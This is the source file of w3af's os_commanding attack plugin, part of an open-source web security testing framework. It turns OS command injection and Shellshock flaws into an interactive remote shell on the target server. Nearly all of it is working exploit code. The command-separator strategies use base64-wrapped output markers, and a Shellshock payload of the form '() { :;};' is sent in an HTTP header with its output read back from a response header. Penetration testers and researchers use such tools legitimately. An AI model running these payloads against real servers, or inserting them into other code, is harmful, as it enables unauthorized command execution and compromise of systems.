"""
os_commanding.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import w3af.core.controllers.output_manager as om
import w3af.plugins.attack.payloads.shell_handler as shell_handler

from w3af.plugins.attack.payloads.decorators.exec_decorator import exec_debug
from w3af.core.data.kb.exec_shell import ExecShell
from w3af.core.data.fuzzer.utils import rand_alpha
from w3af.core.data.fuzzer.mutants.headers_mutant import HeadersMutant
from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
from w3af.core.controllers.misc.common_attack_methods import CommonAttackMethods
from w3af.core.controllers.exceptions import (BaseFrameworkException,
                                              BodyCutException)


class ExploitStrategy(object):
    """
    Base class for the different types of exploit strategies that this plugin
    can use to execute commands and get the results.
    """
    def __init__(self, vuln):
        self.vuln = vuln

    def send(self, cmd, opener):
        mutant = self.vuln.get_mutant().copy()
        mutant.set_token_value(cmd)
        return opener.send_mutant(mutant)
                
    def can_exploit(self, opener):
        raise NotImplementedError

    def generate_command(self, command):
        raise NotImplementedError
    
    def extract_result(self, http_response):
        raise NotImplementedError


class SeparatorExploitStrategy(ExploitStrategy):
    def __init__(self, vuln):
        super(SeparatorExploitStrategy, self).__init__(vuln)

        self._cmd_separator = self.vuln['separator']
        self._remote_os = self.vuln['os']


class BasicExploitStrategy(SeparatorExploitStrategy, CommonAttackMethods):
    def __init__(self, vuln):
        SeparatorExploitStrategy.__init__(self, vuln)
        CommonAttackMethods.__init__(self)

    def can_exploit(self, opener):
        if 'separator' not in self.vuln:
            return False

        if 'os' not in self.vuln:
            return False

        # Define a test command:
        rand = rand_alpha(8)
        expected_output = rand + '\n'
        
        if self._remote_os == 'windows':
            command = self.generate_command('echo %s' % rand)
        else:
            command = self.generate_command('/bin/echo %s' % rand)

        # Lets define the result header and footer.
        http_response = self.send(command, opener)
        return self._define_exact_cut(http_response.get_body(), expected_output)
        
    def generate_command(self, command):
        if self._remote_os == 'windows':
            command = '%s %s' % (self._cmd_separator, command)
        else:
            command = '%s %s' % (self._cmd_separator, command)
            
        return command
    
    def extract_result(self, http_response):
        try:
            return self._cut(http_response.get_body())
        except BodyCutException, bce:
            issue = 'https://github.com/andresriancho/w3af/issues/5139'

            msg = ('Unexpected exception "%s" while trying to extract the'
                   ' command output from the HTTP response body. Please try'
                   ' again.\n\n'

                   'If the problem persists please add a comment with this'
                   ' exception message and the steps to reproduce the issue'
                   ' to %s\n\n')

            return msg % (bce, issue)


class FullPathExploitStrategy(SeparatorExploitStrategy):
    """
    This strategy allows us to retrieve binary output from the commands we run
    without any errors. Also, it returns exactly the bytes returned by the
    command without any trailing or leading \n or any guessing on the command
    result length.
    """
    REMOTE_CMD = "%s /bin/echo -n '%s'; %s | /usr/bin/base64 | "\
                 "/usr/bin/tr -d '\n'; /bin/echo -n '%s'"
    
    def can_exploit(self, opener):
        rand = rand_alpha(8)
        cmd = self.generate_command('echo %s|rev' % rand)
        
        # For some reason that I don't care about, rev adds a \n to the string
        # it reverses, even when I run the echo with "-n".
        expected_output = '%s\n' % rand[::-1]
        
        http_response = self.send(cmd, opener)
        return expected_output == self.extract_result(http_response)
        
    def generate_command(self, command):
        return self.REMOTE_CMD % (self._cmd_separator,
                                  shell_handler.SHELL_IDENTIFIER_1,
                                  command, shell_handler.SHELL_IDENTIFIER_2)
    
    def extract_result(self, http_response):
        try:
            return shell_handler.extract_result(http_response.get_body())
        except BaseFrameworkException:
            return None


class CmdsInPathExploitStrategy(FullPathExploitStrategy):
    """
    This strategy allows us to retrieve binary output from the commands we run
    without any errors. Also, it returns exactly the bytes returned by the
    command without any trailing or leading \n or any guessing on the command
    result length.
    """
    REMOTE_CMD = "%s echo -n '%s'; %s | base64 | "\
                 "tr -d '\n'; echo -n '%s'"


class ShellShock(ExploitStrategy):
    """
    Exploit shell-shock vulnerabilities which require us to send the payload
    in a header. We exploit it in such a way that the response also comes in
    a (response) header.
    """
    INJECTED_HEADER = 'Shock'
    PATH = '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:' \
           '/usr/games:/usr/local/games'
    NEW_LINE = '@@n-.'

    # Even after applying the variables above this is a format string which
    # receives the command to run. Note the %%s below:
    PAYLOAD_FMT = '() { :;};PATH=$PATH:%s;%%s | sed "s/$/%s/" | tr -d "\\n\\r"'\
                  ' | /usr/bin/awk "{print \\"%s: \\"\$0\\"\\n\\"}"'
    PAYLOAD_FMT = PAYLOAD_FMT % (PATH, NEW_LINE, INJECTED_HEADER)

    def send(self, cmd, opener):
        mutant = self.vuln.get_mutant().copy()
        mutant.set_token_value(cmd)
        return opener.send_mutant(mutant)

    def can_exploit(self, opener):
        if not isinstance(self.vuln.get_mutant(), HeadersMutant):
            return False

        test_command = 'echo -n w3af'
        http_response = self.send(self.generate_command(test_command), opener)
        return self.extract_result(http_response) == 'w3af'

    def generate_command(self, command):
        return self.PAYLOAD_FMT % command

    def extract_result(self, http_response):
        header_value, _ = http_response.get_headers().iget(self.INJECTED_HEADER)

        if header_value is None:
            return 'Shell shock command execution failed.'

        header_value = header_value.strip()
        return header_value.replace(self.NEW_LINE, '\n').strip()


class os_commanding(AttackPlugin):
    """
    Exploit OS Commanding vulnerabilities.

    :author: Andres Riancho (andres.riancho@gmail.com)
    """
    EXPLOIT_STRATEGIES = [FullPathExploitStrategy, CmdsInPathExploitStrategy,
                          BasicExploitStrategy, ShellShock]
    
    def __init__(self):
        AttackPlugin.__init__(self)

    def get_attack_type(self):
        """
        :return: The type of exploit, SHELL, PROXY, etc.
        """
        return 'shell'

    def get_kb_location(self):
        """
        This method should return the vulnerability names (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds a
        vuln, and saves it as:

        kb.kb.append('os_commanding', 'os_commanding', vuln)

        Then the exploit plugin that exploits os_commanding
        (attack.os_commanding) should return ['os_commanding',] in this method.
        
        If there is more than one location the implementation should return
        ['a', 'b', ..., 'n']
        """
        return ['os_commanding', 'shell_shock']

    def _generate_shell(self, vuln):
        """
        :param vuln: The vuln to exploit.
        :return: The shell object based on the vulnerability that was passed as
                 parameter.
        """
        # Check if we really can execute commands on the remote server
        strategy = self._verify_vuln(vuln)
        if strategy:
            # Create the shell object
            shell_obj = OSCommandingShell(strategy, self._uri_opener,
                                          self.worker_pool)
            return shell_obj

        else:
            return None

    def _verify_vuln(self, vuln):
        """
        This command verifies a vuln. This is really hard work!

        :return : True if vuln can be exploited.
        """
        for StrategyKlass in self.EXPLOIT_STRATEGIES:

            try:
                strategy = StrategyKlass(vuln)
            except KeyError:
                om.out.debug('%s can not exploit %s' % (StrategyKlass, vuln))
                continue
            
            msg = 'Trying to exploit vuln %s using %s.'
            om.out.debug(msg % (vuln.get_id(), strategy))
            
            if strategy.can_exploit(self._uri_opener):
                om.out.debug('Success with strategy %s.' % strategy)
                return strategy
        
        om.out.debug('All strategies failed!')
        
        # No strategy can exploit this vulnerability
        return False
    
    def get_root_probability(self):
        """
        :return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        """
        return 0.8

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin exploits os commanding vulnerabilities and returns a
        remote shell.
        """


class OSCommandingShell(ExecShell):

    def __init__(self, strategy, uri_opener, worker_pool):
        super(OSCommandingShell, self).__init__(strategy.vuln,
                                                uri_opener,
                                                worker_pool)

        self.strategy = strategy

    @exec_debug
    def execute(self, command):
        """
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        :param command: The command to handle ( ie. "ls", "whoami", etc ).
        :return: The result of the command.
        """
        strategy_cmd = self.strategy.generate_command(command)
        try:
            http_response = self.strategy.send(strategy_cmd,
                                               self.get_url_opener())
        except BaseFrameworkException, e:
            msg = ('Error "%s" while sending HTTP request with OS command to'
                   ' remote host. Please try again.')
            return msg % e
        else:
            return self.strategy.extract_result(http_response)

    def get_name(self):
        return 'os_commanding'

    def __reduce__(self):
        """
        @see: Shell.__reduce__ to understand why this is required.
        """
        return self.__class__, (self.strategy, None, None)